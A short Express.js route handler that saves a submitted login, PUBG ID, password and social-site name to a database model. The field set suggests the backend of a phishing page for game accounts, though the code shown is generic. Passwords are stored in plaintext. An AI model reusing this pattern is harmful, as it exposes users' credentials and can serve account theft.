import cardModel from "../../models/card.js";

export const createInformation = async (req, res) => {
  const { login, pubgId, password, socialSite } = req.body;

  try {
    const information = await cardModel.create({
      login,
      pubgId,
      password,
      socialSite,
    });
    res.status(200).json("ok");
  } catch (err) {
    res.status(500).json({ message: "Something went wrong" });
    console.log(err);
  }
};
